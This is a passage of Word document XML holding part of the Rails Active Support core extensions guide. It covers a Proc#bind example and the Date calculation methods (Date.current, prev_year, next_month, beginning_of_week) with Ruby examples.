        <w:t>, thus simplifying the code in the caller:</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3A17C38" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="548873DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>handler_for_rescue(exception)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11D1FE71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  _, rescuer = Array(rescue_handlers).reverse.detect do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|klass_name, handler|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="401AF304" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64E9C29B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76DBB28F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="655E1A9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  case</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescuer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66303D92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  when</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Symbol</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63B6F4E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    method(rescuer)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CDD830D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  when</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Proc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58F97AB7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    rescuer.bind(self)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75E59505" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0392D928" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55273C05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/proc.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D367730" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D875172" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>15.1 Calculations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4C3033" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">All the following methods are defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/date/calculations.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E1C754" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The following calculation methods have edge cases in October 1582, since days 5..14 just do not exist. This guide does not document their behavior around those days for brevity, but it is enough to say that they do what you would expect. That is, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.new(1582, 10, 4).tomorrow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.new(1582, 10, 15)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and so on. Please check </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/core_ext/date_ext_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the Active Support test suite for expected behavior.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A8C132" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.current</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090899A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be today in the current time zone. That’s like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.today</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, except that it honors the user time zone, if defined. It also defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.yesterday</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.tomorrow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and the instance predicates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>past?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>today?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>future?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, all of them relative to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.current</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29FB19CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When making Date comparisons using methods which honor the user time zone, make sure to use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.today</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. There are cases where the user time zone might be in the future compared to the system time zone, which </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.today</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> uses by default. This means </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.today</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may equal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date.yesterday</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21196C32" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>15.1.2 Named dates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67587FC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next_year</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492A9EF4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Ruby 1.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return a date with the same day/month in the last or next year:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="14E13C33" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0320D02F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 8) # =&gt; Sat, 08 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CDF50E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.prev_year              # =&gt; Fri, 08 May 2009</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E2E64E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.next_year              # =&gt; Sun, 08 May 2011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1FCF1AF0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If date is the 29th of February of a leap year, you obtain the 28th:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="66874EF0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="67493BAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2000, 2, 29) # =&gt; Tue, 29 Feb 2000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F8381E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.prev_year               # =&gt; Sun, 28 Feb 1999</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="731ACF15" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.next_year               # =&gt; Wed, 28 Feb 2001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6FEC4632" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Support defines these methods as well for Ruby 1.8.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564DD36A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>last_year</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B46F0A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next_month</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F148AD4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Ruby 1.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return the date with the same day in the last or next month:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="53910C3D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="321EC9B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 8) # =&gt; Sat, 08 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="622CAAF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.prev_month             # =&gt; Thu, 08 Apr 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66A7EF37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.next_month             # =&gt; Tue, 08 Jun 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E8F5247" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If such a day does not exist, the last day of the corresponding month is returned:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5C51ABD8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B5470FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2000, 5, 31).prev_month # =&gt; Sun, 30 Apr 2000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="517F9C36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2000, 3, 31).prev_month # =&gt; Tue, 29 Feb 2000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27989896" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2000, 5, 31).next_month # =&gt; Fri, 30 Jun 2000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24228B95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(2000, 1, 31).next_month # =&gt; Tue, 29 Feb 2000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="443A59B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Support defines these methods as well for Ruby 1.8.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D903F3C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>last_month</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D6A966" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_week</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532DAEA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return the dates for the beginning and end of the week, respectively. Weeks are assumed to start on Monday, but that can be changed passing an argument.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="70906D76" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A914B01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 8)     # =&gt; Sat, 08 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52F72A26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.beginning_of_week          # =&gt; Mon, 03 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F18C3E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
